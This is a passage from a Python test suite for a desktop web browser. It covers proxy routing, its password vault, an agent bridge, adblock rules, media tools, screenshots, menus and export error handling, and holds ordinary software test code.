    br.bookmarks = _bms_x189
# ---- tests for the 190 group ----
import inspect as _insp190

# J66: every early return in _download closes the blank download tab
_src190 = _insp190.getsource(B.Browser._download)
check("a declined or cancelled download closes its blank tab",
      _src190.count("self._close_download_tab(page)") >= 5, str(
          _src190.count("self._close_download_tab(page)")))

# J67: block lists reach the RuleProxy behind a plain named proxy
_keys190 = ("activeProxy", "proxyProfiles", "proxyAuto", "blockHosts",
            "blockReplay", "phishingList")
_cfg190 = {"activeProxy": "p190", "proxyAuto": {"rules": []},
           "proxyProfiles": [{"name": "p190", "type": "socks5",
                              "host": "127.0.0.1", "port": 9}],
           "blockHosts": ["blocked190.example"], "blockReplay": False,
           "phishingList": False}
_plan190 = B._proxy_routing(_cfg190)
_cfg190["blockHosts"] = []
_none190 = B._proxy_routing(_cfg190)
_cfg190["blockHosts"] = ["blocked190.example"]
_cfg190["activeProxy"] = "direct"
_direct190 = B._proxy_routing(_cfg190)
check("a block list behind a plain proxy gets a routing plan",
      _plan190 is not None and _plan190[0] == []
      and _plan190[2][0] == "socks5", str(_plan190))
check("no block list, or a direct connection, keeps the plain flags",
      _none190 is None and _direct190 is None)

# J68: a hand-edited pwGen
_pw190 = br.config.get("pwGen")
_vp190 = br.vault_password_on
_clip190 = []
_real_copy190 = br._copy_secret_text
br.vault_password_on = lambda: True
br._copy_secret_text = lambda text, *a, **k: _clip190.append(len(text))
_ok190 = True
try:
    for _bad190 in ([1], "x", {"length": "abc"}, {"length": None}):
        br.config["pwGen"] = _bad190
        try:
            br.generate_to_clipboard()
        except Exception as e:
            _ok190 = False
            _clip190.append(repr(e))
finally:
    br.__dict__.pop("vault_password_on", None)
    br.__dict__.pop("_copy_secret_text", None)
    if _pw190 is None:
        br.config.pop("pwGen", None)
    else:
        br.config["pwGen"] = _pw190
check("a hand-edited pwGen still puts a password on the clipboard",
      _ok190 and len(_clip190) == 4, str(_clip190))

# J69: dedupe keeps lines named like Object members
check("dedupe uses a prototype-free table",
      "Object.create(null)" in B.MEDIA_XFORM + _insp190.getsource(B)
      and "seen = Object.create(null), keep" in _insp190.getsource(B))

# J70: turn and zoom compose one transform
check("turn and zoom write through one shared transform",
      "xform(m)" in B.MEDIA_TOOLS2["turn"]
      and "xform(m)" in B.MEDIA_TOOLS2["zoom"]
      and "scale(\" + z.scale" in B.MEDIA_XFORM
      and "rotate(\" + t.deg" in B.MEDIA_XFORM)

# J71/J72: the hand-off target
_main190 = _insp190.getsource(B.main)
check("a command with only private windows left opens no window",
      'message.startswith("cmd ")' in _main190
      and "new_window(minimized=quiet)" in _main190)
check("a command goes to the window he is in",
      "QApplication.activeWindow()" in _main190)
check("new_window can come up minimized",
      "minimized" in _insp190.signature(B.Browser.new_window).parameters)

# JS6: only web addresses become media links
_rows190 = []
_real190 = br.media_tool2
br.media_tool2 = lambda name, view=None, then=None, arg=None: then(json.dumps([
    {"url": "https://a.example/v.mp4", "title": "a"},
    {"url": "edl://x.mp4", "title": "b"},
    {"url": "file:///etc/x.mp4", "title": "c"},
    {"url": "HTTP://a.example/w.mp3", "title": "d"}, "junk"]))
try:
    br.media_links(then=lambda rows: _rows190.extend(rows))
finally:
    br.__dict__.pop("media_tool2", None)
check("media links keep only http and https rows",
      [r["title"] for r in _rows190] == ["a", "d"], str(_rows190))
# ===== K0-K8: agent bridge reply, fill, find, groups, watch, tree, autoclick, history =====
import agent_bridge as _AB191
import inspect as _insp191
_ab191 = _AB191.AgentBridge(br)
# a second bridge counts its tab ids from 1 again, so a tab the suite's
# earlier bridges numbered could answer to a new tab's id: start above
# every id handed out so far
_ab191._next_id = 1 + max([10 ** 6] + [
    int(getattr(br.tabs.widget(_i), "_agent_id", 0) or 0)
    for _i in range(br.tabs.count())])
_out191 = []
_ab191._reply = lambda conn, payload: _out191.append(payload)

# K0: _reply copes with a value json cannot serialize
class _Conn191:
    def __init__(self):
        self.data = b""
    def state(self):
        return _AB191.QLocalSocket.LocalSocketState.ConnectedState
    def write(self, b):
        self.data += b
    def flush(self):
        pass
_c191 = _Conn191()
try:
    # a value json itself refuses (a QDateTime comes back from a page's
    # Date much like this): written as text, not dropped with a TypeError
    import datetime as _dt191
    _AB191.AgentBridge._reply(_ab191, _c191,
                              {"ok": True, "result": _dt191.datetime(2020, 1, 1)})
    _k0_191 = json.loads(_c191.data.decode().strip().splitlines()[-1]) \
        .get("result", "").startswith("2020-01-01")
except TypeError:
    _k0_191 = False
check("a reply holding an unserializable value is still written",
      _k0_191, str(_c191.data))

# K1, K2, K6: page code
check("fill sets values through the prototype setter",
      "getOwnPropertyDescriptor" in _AB191._FILL_JS)
check("find's selectors climb to a unique id or the root",
      "parts.length < 6" not in _AB191._FINDTEXT_JS)
check("the tree does not name a password field with its value",
      'el.type === "password"' in _AB191.AgentBridge.TREE_JS)

# K3 / K4: groups
_ga191 = br.new_tab(url=srv.url("/twhome?g1=1"), switch=False)
_gb191 = br.new_tab(url=srv.url("/twhome?g2=1"), switch=False)
H.wait_for(lambda: "/twhome" in _ga191.url().toString()
           and "/twhome" in _gb191.url().toString(), 8000)
_pv191 = br.new_tab(url=srv.url("/twhome?g3=1"), switch=False, private=True)
H.wait_for(lambda: "/twhome" in _pv191.url().toString(), 8000)
try:
    _ab191._views()
    _out191.clear()
    _ab191.op_groups(None, {"move": _ga191._agent_id, "group": "g191"})
    _ab191.op_groups(None, {"move": _gb191._agent_id, "group": "g191"})
    _ab191.op_groups(None, {"move": _ga191._agent_id, "group": ""})
    check("moving one tab out of a group leaves the others in it",
          br._group_of(_ga191) is None and br._group_of(_gb191) == "g191"
          and "g191" in br.groups,
          str((br._group_of(_ga191), br._group_of(_gb191), br.groups)))
    _out191.clear()
    _ab191.op_groups(None, {"move": _pv191._agent_id, "group": "p191"})
    check("a private tab is refused before a group header is made",
          _out191 and _out191[-1].get("error") == "private-tab"
          and "p191" not in br.groups, str((_out191, br.groups)))
finally:
    for _g191 in ("g191", "p191"):
        if _g191 in br.groups:
            br.ungroup(_g191)
    for _v191 in (_ga191, _gb191, _pv191):
        br.close_tab(br.tabs.indexOf(_v191), ask=False)

# K5: a watch on a private tab is refused
_pw191 = br.new_tab(url=srv.url("/twhome?w=1"), switch=False, private=True)
H.wait_for(lambda: "/twhome" in _pw191.url().toString(), 8000)
try:
    _ab191._views()
    _out191.clear()
    _n191 = len(_ab191.watches)
    _ab191.op_watch(None, {"tab": _pw191._agent_id})
    check("a watch on a private tab is refused, not started and dropped",
          _out191 and _out191[-1].get("error") == "private-tab"
          and len(_ab191.watches) == _n191, str(_out191[-1:]))
finally:
    br.close_tab(br.tabs.indexOf(_pw191), ask=False)

# K7: autoclick keeps the host the page matches
_ac191 = br.config.get("autoClick", "__absent__")
try:
    _out191.clear()
    _ab191.op_autoclick(None, {"host": "WWW.Example.COM",
                               "selector": "button.accept"})
    check("an autoclick rule is stored under the lower-case host without www.",
          (br.config.get("autoClick") or {}).get("example.com")
          == ["button.accept"], str(br.config.get("autoClick")))
    _ab191.op_autoclick(None, {"host": "www.example.com", "remove": True})
    check("...and removed by either spelling",
          "example.com" not in (br.config.get("autoClick") or {}),
          str(br.config.get("autoClick")))
finally:
    if _ac191 == "__absent__":
        br.config.pop("autoClick", None)
    else:
        br.config["autoClick"] = _ac191

# K8: history held to the site list
_sites191 = br.config.get("bridgeSites", "__absent__")
_hist191 = list(br.history or [])
try:
    br.history[:] = [{"url": "https://a191.example/x", "title": "a", "t": 1},
                     {"url": "https://b191.example/y", "title": "b", "t": 2}]
    br.config["bridgeSites"] = ["a191.example"]
    _out191.clear()
    _ab191.op_history(None, {})
    _urls191 = [r["url"] for r in _out191[-1].get("history", [])]
    check("history returns only the sites on the list",
          _urls191 == ["https://a191.example/x"], str(_urls191))
finally:
    br.history[:] = _hist191
    if _sites191 == "__absent__":
        br.config.pop("bridgeSites", None)
    else:
        br.config["bridgeSites"] = _sites191
# ===== batch 192: split view theming, aero buttons, theme-this-site, media list, frames, undo, mp4
import inspect as _insp192
import os as _os192
import theme_web as _tw192
import page_guard as _pg192
import capture as _cap192
from PyQt6.QtGui import QImage as _QI192, QColor as _QC192

# K9: the split view's page is visited by _open_sites
class _SplitStub192:
    def page(self):
        return None

    class _U:
        def scheme(self):
            return "https"

    def url(self):
        return self._U()


_stub192 = _SplitStub192()
_old192 = getattr(br, "_split_view", None)
br._split_view = _stub192
try:
    _seen192 = list(_tw192._open_sites(br))
finally:
    br._split_view = _old192
check("the right half of a split view is among the open sites",
      any(v is _stub192 for v in _seen192), str(len(_seen192)))

# K10: the aero gloss does not override an icon's background image
_css192 = _tw192._aero({"accentLt": "#88f"})
_gloss192 = _css192[_css192.index("button {"):_css192.index("box-shadow")]
check("the aero gloss is not !important", "!important" not in _gloss192,
      _gloss192)

# K11: Theme this site works for a host also in the other exclusion list
_cfg192 = (list(br.config.get("themeWebSkip") or []),
           list(br.config.get("darkSiteRules") or []),
           br.config.get("themeWeb", True))
try:
    br.config["themeWeb"] = True
    br.config["themeWebSkip"] = ["both192.example"]
    br.config["darkSiteRules"] = ["both192.example"]
    _themed192 = _tw192.toggle_host(br, "both192.example")
    check("a host in both lists is themed after 'Theme this site'",
          _themed192 is True and "both192.example" not in
          (br.config.get("darkSiteRules") or []), str(br.config.get(
              "darkSiteRules")))
finally:
    br.config["themeWebSkip"], br.config["darkSiteRules"] = _cfg192[0], _cfg192[1]
    br.config["themeWeb"] = _cfg192[2]
    br.set_dark_site_rules(_cfg192[1])
    br.save_config()

# K12: the media list is recomputed on read, and dead streams dropped
_src192 = _insp192.getsource(_pg192)
check("the guard exposes a relist and prunes ended streams",
      "window.__guardRelist = relist" in _src192
      and "window.__guardStreams = kept" in _src192)
check("the browser asks for a fresh media list before reading it",
      "__guardRelist" in _insp192.getsource(B.Browser.media_users))

# K13: a sibling subdomain is the same site
check("noFrames compares registrable names",
      "siteOf(other) !== siteOf(host)" in _src192)

# K14: undo after crop then box does not crop twice
_img192 = _QI192(300, 300, _QI192.Format.Format_RGB32)
_img192.fill(_QC192("#ffffff"))
_an192 = _cap192.Annotator(_img192)
_an192.crop(100, 100, 200, 200)
_an192.box(10, 10, 50, 50)
_an192.box(20, 20, 30, 30)
_an192.undo()
check("undo after a crop keeps the cropped size",
      (_an192.image.width(), _an192.image.height()) == (200, 200),
      str((_an192.image.width(), _an192.image.height())))
_an192.stamp("x")
_an192.undo()
check("undo of a stamp leaves one strip's worth less",
      _an192.image.height() == 200, str(_an192.image.height()))

# K15: odd sizes scaled to even, partial file removed
_vsrc192 = _insp192.getsource(_cap192.frames_to_video)
check("mp4 and webm frames are scaled to an even size",
      "scale=trunc(iw/2)*2:trunc(ih/2)*2" in _vsrc192)
_tmp192 = _Path(_tempfile.mkdtemp()) / "x.mp4"
_tmp192.write_bytes(b"partial")
_cap192._drop_partial(_tmp192)
check("a partial video file is removed", not _tmp192.exists())
# ===== K16 K17 K18 KS1 KS2: notes, clips, mpris, adblock =====
import adblock as _ad193
_pn193 = B.notes.parse_note("---\ntitle: T\n---\na b\x0bc\x0cd\r\ne\n\n")
check("a note body keeps its own line breaks and trailing newlines",
      _pn193["body"] == "a b\x0bc\x0cd\r\ne\n\n", repr(_pn193["body"]))
_rt193 = B.notes.parse_note(B.notes.note_text(_pn193))
check("...through a save and a read",
      _rt193["body"] == _pn193["body"], repr(_rt193["body"]))

_desk193 = B.notes.Desk(_tempfile.mkdtemp())
_big193 = "x" * 30000
_desk193.add_clip(_big193)
_i193 = _desk193.clip_index(0, text=_big193)
_desk193._clips[_i193]["pinned"] = True
_desk193.add_clip(_big193)
check("a clip over the cap dedupes, stays pinned and is found by text",
      len(_desk193._clips) == 1 and _i193 == 0
      and _desk193._clips[0]["pinned"], str(len(_desk193._clips)))

import inspect as _insp193
import mpris as _mp193
_svc193 = _mp193.Service.__new__(_mp193.Service)
_svc193.status, _svc193.metadata, _svc193._announced = "Stopped", {}, None
_svc193._calls = 0
def _ann193():
    _svc193._calls += 1
    return True
_svc193._announce = _ann193
_mp193.Service.update(_svc193, True, "t", "a")
_mp193.Service.update(_svc193, True, "t", "a")
_mp193.Service.update(_svc193, False, "t", "a")
check("an unchanged status and track is announced once, a change again",
      _svc193._calls == 2, str(_svc193._calls))

_rs193 = _ad193.Rules()
_rs193.load_text("foo.js|\n/ads/*.swf|\n")
check("an end anchor matches a last part that also occurs earlier",
      _rs193.blocks("https://x.com/foo.js?y=foo.js") == "foo.js|"
      and _rs193.blocks("https://x.com/a/foo.js") == "foo.js|"
      and _rs193.blocks("https://x.com/ads/a.swf/b.swf") == "/ads/*.swf|"
      and _rs193.blocks("https://x.com/foo.js?y=1") is None, "")
_rs193.load_text("~ok193.com##.neg193\na193.com,~b193.com##.mix193\n")
check("negated hosts leave a site out instead of naming one",
      ".neg193" in _rs193.hide_for("other.com")
      and ".neg193" not in _rs193.hide_for("www.ok193.com")
      and ".mix193" in _rs193.hide_for("a193.com")
      and ".mix193" not in _rs193.hide_for("b193.com")
      and ".mix193" not in _rs193.hide_for("c.com"), "")
# ---- 194: settings page number boxes, buttons, language picker and text fill ----
_set_x194 = (_Path(B.__file__).parent / "settings.html").read_text()
for _id_x194 in ("recfps", "recbufferseconds", "lapseminutes", "barrows",
                 "bartextsize", "tabminwidth"):
    _m_x194 = [l for l in _set_x194.split("<input") if 'id="%s"' % _id_x194 in l]
    check("%s: 0 clamps to the minimum (data-zero=no)" % _id_x194,
          bool(_m_x194) and 'data-zero="no"' in _m_x194[0].split(">")[0])
check("appearance numbers clamp to min and max",
      "if (!isNaN(hi) && n > hi) n = hi;" in
      _set_x194.split("function bindAppearance")[1].split("LOOK_TEXTS")[0])
check("corner radius label keeps px while dragged",
      'id === "cornerradius" ? "px" : "%"' in _set_x194)
check("appearance buttons are bound without waiting for the bridge",
      "if (!el || !bridge || !bridge.appearanceAction) continue;"
      not in _set_x194
      and "if (!bridge || !bridge.appearanceAction) return;" in _set_x194)
check("language picker keeps the saved language",
      "const current = window._tlang || sel.value;" in _set_x194)
check("settings text fill covers every t_ element",
      "[id^='t_']" in _set_x194)
# ---- 195: start wizard, passwords, history and mic test page fixes ----
_dir_x195 = _Path(B.__file__).parent
_st_x195 = (_dir_x195 / "start.html").read_text()
_pw_x195 = (_dir_x195 / "passwords.html").read_text()
_hi_x195 = (_dir_x195 / "history.html").read_text()
_mi_x195 = (_dir_x195 / "mictest.html").read_text()
check("195 K28 ring wheel and arrows leave the wizard and settings alone",
      "if (wizOpen || (e.target.closest && e.target.closest(\"#settings\"))) return;" in _st_x195
      and "if (wizOpen) return;         // the arrows" in _st_x195)
check("195 K29 wizard zoom slider covers 50-200",
      'r.min = "50"; r.max = "200"; r.step = "5";' in _st_x195)
check("195 K30 start-url message uses a function replacement",
      '.replace("{a}", () => m[1] || "")' in _st_x195)
check("195 K31 passwords drops a filter whose chip is gone",
      "filter.flag = \"\";" in _pw_x195
      and "!VAULT.tags.includes(filter.tag)) filter.tag = \"\"" in _pw_x195
      and "filter.fav = false; filter.flag = \"\"" in _pw_x195)
check("195 K32 history groups and icons are Maps",
      "let icons = new Map();" in _hi_x195
      and "const groups = new Map();" in _hi_x195
      and "groups[host]" not in _hi_x195)
check("195 K33 passwords replacements are functions",
      'replace("{}", () => titleOf(it))' in _pw_x195
      and 'replace("{}", () => d.path)' in _pw_x195
      and 'replace("{}", titleOf(it))' not in _pw_x195)
check("195 K34 a cut recording says nothing and old URLs are revoked",
      "recorder.cut = true" in _mi_x195 and "if (recorder.cut) return;" in _mi_x195
      and "URL.revokeObjectURL(recorded)" in _mi_x195
      and _mi_x195.count("cutRecorder();") == 2)
check("195 KS6 Start cancels the running meter loop",
      "if (raf) cancelAnimationFrame(raf);\n      meter();" in _mi_x195)

# ---- fix207: a null guard key in config.json still opens the menu ----
_gk207 = next(iter(B.Browser.GUARD_KEY.values()), None) \
    if B.page_guard is not None else None
if _gk207:
    _had207 = _gk207 in br.config
    _was207 = br.config.get(_gk207)
    br.config[_gk207] = None
    try:
        _m207 = br.guard_menu()
        check("207 a null guard setting does not stop the guard menu",
              _m207 is not None and len(_m207.actions()) > 0)
        _m207.deleteLater()
    except TypeError as _e207:
        check("207 a null guard setting does not stop the guard menu",
              False, str(_e207))
    finally:
        if _had207:
            br.config[_gk207] = _was207
        else:
            br.config.pop(_gk207, None)

# ---- 196: popup and exec menus free themselves ----
_exec_orig196 = B.QMenu.exec
_calls196 = []
try:
    B.QMenu.exec = lambda self, *a, **k: (_calls196.append(1), None)[1]
    H.spin(50)
    _before196 = len(br.findChildren(B.QMenu))
    for _i196 in range(5):
        br._tab_menu(0, where=B.QPoint(5, 5))
        br._session_menu(br.tabs, br.sessions[0]["sid"])
        br._bmbar_menu(B.QPoint(1, 1))
        br.show_tag("nosuchtag196")
    H.spin(100)
    _after196 = len(br.findChildren(B.QMenu))
    check("196 exec menus do not pile up under the window",
          len(_calls196) >= 20 and _after196 <= _before196 + 2,
          "%d -> %d, execs %d" % (_before196, _after196, len(_calls196)))
finally:
    B.QMenu.exec = _exec_orig196

for _name196 in ("site_info_menu", "key_menu_here", "guard_menu", "cookie_menu",
                 "media_menu", "mc_menu", "task_menu", "dev_menu",
                 "snippets_menu", "page_storage_menu", "cookies_menu",
                 "media_menu2"):
    try:
        _m196 = getattr(br, _name196)()
        check("196 %s frees itself on close" % _name196,
              _m196.testAttribute(B.Qt.WidgetAttribute.WA_DeleteOnClose))
        _m196.deleteLater()
    except Exception as _e196:
        check("196 %s frees itself on close" % _name196, False, repr(_e196))
H.spin(50)
# ---- twenty-first pass, group 197: walker, auth marker, bookmark scroll, hand-off reply ----
import inspect as _inspect_197
_src_w197 = _inspect_197.getsource(B.Browser.restore_tab_history)
check("197 history walker checks the load is its own",
      "requestedUrl" in _src_w197 and '"want"' in _src_w197)

# a navigation he makes mid-walk is not overridden
_v197 = br.new_tab()
try:
    _t0197 = srv.url("/twhome")
    _mine197 = srv.url("/drafts") + "?mine197=1"
    br.restore_tab_history(_v197, [srv.url("/timers"), srv.url("/drafts"),
                                   srv.url("/twhome")], at=0)
    H.wait_for(lambda: "/timers" in _v197.url().toString(), 8000)
    H.load(_v197, _mine197)
    H.wait_for(lambda: "mine197" in _v197.url().toString(), 8000)
    H.spin(1500)
    check("197 a navigation mid-walk is not overridden",
          "mine197" in _v197.url().toString(), _v197.url().toString())
finally:
    _close_if_open(_v197)

# ...and left alone, the walk still rebuilds the Back list and steps back
# to where he was (the check above passes too if the walker just dies)
_v2_197 = br.new_tab()
try:
    br.restore_tab_history(_v2_197, [srv.url("/timers"), srv.url("/drafts"),
                                     srv.url("/twhome")], at=1)

    def _walked197():
        try:
            h = _v2_197.page().history()
            urls = [i.url().toString() for i in h.items()]
        except RuntimeError:
            return False
        return (any("/twhome" in u for u in urls)
                and "/drafts" in _v2_197.url().toString()
                and h.canGoForward())
    H.wait_for(_walked197, 15000)
    check("197 the walk still rebuilds the Back list and steps back",
          _walked197(),
          [i.url().toString() for i in _v2_197.page().history().items()])
finally:
    _close_if_open(_v2_197)

# the saved login is offered again on a later visit
check("197 auth marker carries a time",
      "monotonic" in _inspect_197.getsource(B.Browser._http_auth))

# bookmark scroll: the handler is one shot and a failed load clears the offset
_sob197 = _inspect_197.getsource(B.Browser.open_bookmark)
check("197 bookmark handler is one shot and only scrolls its own page",
      "disconnect(put_back)" in _sob197 and "requestedUrl" in _sob197
      and "_bm_put_back" in _sob197)

# hand-off reply survives a deleted socket
_sm197 = _inspect_197.getsource(B.main)
check("197 hand-off reply guards RuntimeError",
      "except RuntimeError" in _sm197.split("def reply")[1].split("def act")[0])
# ---- 198: pinned shots, shot_all_tabs, shot_mobile, recording cap ----
import inspect as _insp_x198
if B.capture is not None:
    _img_x198 = B.QImage(40, 30, B.QImage.Format.Format_RGB32)
    _img_x198.fill(0xff336699)
    _before_x198 = len(getattr(br, "_pinned_shots", []))
    br._shot_done(_img_x198, copy=False, save=False, pin=True)
    _win_x198 = br._pinned_shots[-1]
    check("198 L2 a pin is on the list while open",
          len(br._pinned_shots) == _before_x198 + 1)
    _win_x198.close()
    H.spin(100)
    B.QApplication.sendPostedEvents(None, 52)  # DeferredDelete
    H.spin(100)
    check("198 L2 a closed pin leaves the list",
          len(br._pinned_shots) == _before_x198
          and _win_x198 not in br._pinned_shots)

    _src_x198 = _insp_x198.getsource(B.Browser.shot_all_tabs)
    check("198 L3 shot_all_tabs looks each tab up again",
          "indexOf(view)" in _src_x198 and "except RuntimeError" in _src_x198
          and "was = self.tabs.currentIndex()" not in _src_x198)

    # L4: the view dies during the wait; the phone agent is given back
    _view_x198 = br.new_tab()
    H.load(_view_x198, srv.url("/twhome"))
    H.wait_for(lambda: "/twhome" in _view_x198.url().toString(), 8000)
    _host_x198 = br._host_of(_view_x198.url())
    _table_x198 = br.agent_sites()
    _had_x198 = (_host_x198 in _table_x198, _table_x198.get(_host_x198))
    _real_full_x198 = B.capture.full_page

    def _boom_x198(*a, **k):
        raise RuntimeError("wrapped C/C++ object has been deleted")
    B.capture.full_page = _boom_x198
    try:
        _res_x198 = br.shot_mobile(view=_view_x198, copy=False, save=False)
    finally:
        B.capture.full_page = _real_full_x198
    check("198 L4 shot_mobile survives a dead view and restores the agent",
          _res_x198 is None
          and (_host_x198 in br.agent_sites(),
               br.agent_sites().get(_host_x198)) == _had_x198)
    if _had_x198[0]:
        br.agent_sites()[_host_x198] = _had_x198[1]
    else:
        br.agent_sites().pop(_host_x198, None)
    _close_if_open(_view_x198)

    # L5: the plain recording stops at the cap
    _cap_x198 = br.RECORD_MAX_BYTES
    _view2_x198 = br.new_tab()
    H.load(_view2_x198, srv.url("/twhome"))
    H.wait_for(lambda: "/twhome" in _view2_x198.url().toString(), 8000)
    br.RECORD_MAX_BYTES = 1
    try:
        _rec_x198 = br.start_recording(view=_view2_x198)
        br._record_tick()
        _stopped_x198 = br.recording_now() is None
    finally:
        br.__dict__.pop("RECORD_MAX_BYTES", None)
        if br.recording_now() is not None:
            br.stop_recording(save=False)
    check("198 L5 a plain recording stops at the memory cap",
          bool(_rec_x198) and _stopped_x198
          and br.RECORD_MAX_BYTES == _cap_x198)
    _close_if_open(_view2_x198)
# ---- twenty-first pass, fixes 199 ----
import inspect as _insp_x199
_alljs_x199 = _insp_x199.getsource(B.Browser.apply_audio_shape)
check("199 L6: audio kit drops detached media elements",
      "el.isConnected || !el.paused) return true" in _alljs_x199
      and "kit.seen = kit.seen.filter" in _alljs_x199)

# L7: closing a second window takes its lens and preview with it
_w_x199 = None
_w_x199 = br.new_window()
if True:
    try:
        _w_x199.magnifier(True)
        _lens_x199 = _w_x199._lens
        _w_x199._closing_anyway = True
        _w_x199.close()
        _ok_x199 = (getattr(_w_x199, "_lens", None) is None
                    and not _lens_x199.isVisible())
        H.spin(80)
        check("199 L7: lens gone after the window closed", _ok_x199)
    finally:
        try:
            _w_x199._closing_anyway = True
            _w_x199.close()
        except RuntimeError:
            pass

# T7: the watcher's job is deleted once checked
_job_x199 = B.BackgroundCall(lambda: None, br)
br._mc_job = _job_x199
_gone_x199 = []
_job_x199.destroyed.connect(lambda *a: _gone_x199.append(1))
br._mc_checked([])
H.spin(80)
check("199 T7: mc job deleted after its check",
      br._mc_job is None and bool(_gone_x199))

# T21: vault_job deletes the finished job
_res_x199 = []
_done_x199 = []
_before_x199 = set(id(c) for c in br.children()
                   if isinstance(c, B.BackgroundCall))
br.vault_job(lambda: 7, _res_x199.append)
_kids_x199 = [c for c in br.children() if isinstance(c, B.BackgroundCall)
              and id(c) not in _before_x199]
H.wait_for(lambda: bool(_res_x199), 5000)
H.spin(100)
check("199 T21: vault job freed after finishing",
      _res_x199 == [7] and not br._vault_jobs and len(_kids_x199) == 1
      and all(B.sip.isdeleted(c) for c in _kids_x199))

# T17: gpu view is dropped after the failure path / answer
check("199 T17: gpu_facts deletes its view",
      "holder.deleteLater()" in _insp_x199.getsource(B.Browser.gpu_facts)
      and "self._gpu_view = None" in _insp_x199.getsource(B.Browser.gpu_facts))
# -- 201: an unreadable vault is not an empty one; a refused generated password is not "saved" --
_d201 = _Path(_tempfile.mkdtemp(dir=str(B.CONFIG_FILE.parent)))
_vl201 = B.VaultLock(_d201)
_vl201.write({"items": [{"host": "keep201", "password": "pw201"}]})
_vf201 = _d201 / "passwords.json"
_orig201 = _vf201.read_bytes()
_vf201.chmod(0)
try:
    _vl2_201 = B.VaultLock(_d201)
    _readable201 = os.access(str(_vf201), os.R_OK) if "os" in globals() else None
    if _readable201 is None or not _readable201:
        _got201 = _vl2_201.read()
        _w201 = _vl2_201.write({"items": [{"host": "new201", "password": "x"}]})
    else:
        _got201, _w201, _vl2_201._blind = {}, False, True   # root: cannot test
finally:
    _vf201.chmod(0o600)
check("an unreadable vault reads blind and refuses a save",
      _got201 == {} and _vl2_201._blind and _w201 is False,
      str((_got201, _vl2_201._blind, _w201)))
check("and the real vault file is still there untouched",
      _vf201.read_bytes() == _orig201)
_vl3_201 = B.VaultLock(_d201)
check("a readable vault opens again afterwards",
      "keep201" in json.dumps(_vl3_201.read()) and not _vl3_201._blind)

_gp201 = br.new_tab(); H.spin(300)
H.load(_gp201, srv.url("/pwform"))
H.wait_for(lambda: "/pwform" in _gp201.url().toString(), 8000)
if br.vault is not None and not br.vault_locked():
    _vpw201 = br.config.get(B.VAULT_PASSWORD_KEY, "__absent__")
    br.config[B.VAULT_PASSWORD_KEY] = True
    _flash201 = []
    _realflash201 = br.flash
    br.flash = lambda msg, *a, **k: _flash201.append(str(msg))
    br.vault.set_entry = lambda *a, **k: None          # the store says no
    _g201 = {}
    try:
        br.generate_for_page(view=_gp201, then=lambda s: _g201.update(v=s))
        H.wait_for(lambda: _flash201, 8000)
        H.spin(200)
    finally:
        br.vault.__dict__.pop("set_entry", None)
        br.__dict__.pop("flash", None)
        if _vpw201 == "__absent__":
            br.config.pop(B.VAULT_PASSWORD_KEY, None)
        else:
            br.config[B.VAULT_PASSWORD_KEY] = _vpw201
    check("a generated password the vault refused is not reported saved",
          any(br._ui_str("genNotSaved") == m for m in _flash201)
          and not any(br._ui_str("genMade").split("%")[0] in m
                      for m in _flash201) and "v" not in _g201,
          str(_flash201))
_close_if_open(_gp201)
# ---- twenty-second pass, fix 202: failure paths of extract, exports and backup ----
import zipfile as _zf202
import inspect as _insp202
_d202 = _Path(_tempfile.mkdtemp(dir=str(B.CONFIG_FILE.parent)))
_flashes202 = []
_oflash202 = br.__dict__.get("flash")
br.flash = lambda msg, *a, **k: _flashes202.append(str(msg))
try:
    # F2: a zip whose extraction raises RuntimeError is a flash, not an exception
    _z202 = _d202 / "locked.zip"
    with _zf202.ZipFile(_z202, "w") as _f202:
        _f202.writestr("a.txt", "hello")
    _oext202 = _zf202.ZipFile.extractall

    def _boom202(self, *a, **k):
        raise RuntimeError("password required")
    _zf202.ZipFile.extractall = _boom202
    try:
        try:
            _r202 = br.extract_archive(path=_z202, ask=False)
            _exc202 = None
        except Exception as _e202:
            _r202, _exc202 = None, _e202
    finally:
        _zf202.ZipFile.extractall = _oext202
    check("F2 a password-protected zip fails cleanly", _r202 == "" and _exc202 is None,
          repr((_r202, _exc202)))
    check("F2 and leaves no half-made folder", not (_d202 / "locked").exists())
    check("F2 the download handler still starts the next download",
          "finally" in _insp202.getsource(B.Browser._download_state))

    # F3: markdown write failure flashes
    _flashes202.clear()
    _blocked202 = _d202 / "isdir.md"
    _blocked202.mkdir()
    _got202 = []
    _ov202 = br.current()
    _opm202 = br.page_markdown
    br.page_markdown = lambda view=None, then=None: then("some text")
    try:
        br.save_page_markdown(view=_ov202, path=str(_blocked202), then=_got202.append)
    finally:
        br.page_markdown = _opm202
    check("F3 a failed markdown save says so", _got202 == [""] and
          br._ui_str("pageSaveFailed") in _flashes202, repr((_got202, _flashes202)))

    # F4: HAR export
    _flashes202.clear()
    br.request_watch().log[:] = [{"url": "https://a/", "host": "a",
                                  "method": "GET", "kind": 0, "t": 0}]
    try:
        _h202 = br.export_har(str(_blocked202))
    finally:
        br.request_watch().log[:] = []
    check("F4 a failed HAR export says so", _h202 == "" and
          br._ui_str("exportFailed") in _flashes202, repr((_h202, _flashes202)))

    # F14: bookmark export
    _flashes202.clear()
    _w202 = br.export_bookmarks(str(_blocked202), fmt="json")
    check("F14 a failed bookmark export is not 0", _w202 is None, repr(_w202))
    _ofd202 = B.QFileDialog.getSaveFileName
    B.QFileDialog.getSaveFileName = staticmethod(lambda *a, **k: (str(_blocked202), ""))
    try:
        br.ask_export_bookmarks()
    finally:
        B.QFileDialog.getSaveFileName = _ofd202
    check("F14 and the user is told", br._ui_str("exportFailed") in _flashes202
          and not any("0" in f and f == br._ui_str("bmExported") % 0 for f in _flashes202),
          repr(_flashes202))
    _ok202 = br.export_bookmarks(str(_d202 / "ok.json"), fmt="json")
    check("F14 a good export still counts links", isinstance(_ok202, int))

    # T14: a cut-off backup of today is rewritten
    _obd202 = B.Browser.bookmark_backup_dir
    _obm202 = list(br.bookmarks)
    B.Browser.bookmark_backup_dir = lambda self: _d202 / "bk"
    try:
        if not br.bookmarks:
            br.bookmarks = [{"id": 1, "type": "link", "title": "t",
                             "url": "https://t202.example/", "parent": 0, "t": 1}]
        (_d202 / "bk").mkdir()
        _t202 = _d202 / "bk" / ("bookmarks-%s.json" % _time.strftime("%Y-%m-%d"))
        _t202.write_text('[{"id": 1, "ty')
        _p202 = br.backup_bookmarks()
        try:
            _back202 = json.loads(_t202.read_text())
        except ValueError:
            _back202 = None
        check("T14 a truncated backup of today is rewritten",
              _p202 == str(_t202) and isinstance(_back202, list) and _back202,
              repr((_p202, _back202)))
    finally:
        B.Browser.bookmark_backup_dir = _obd202
        br.bookmarks = _obm202
finally:
    if _oflash202 is None:
        br.__dict__.pop("flash", None)
    else:
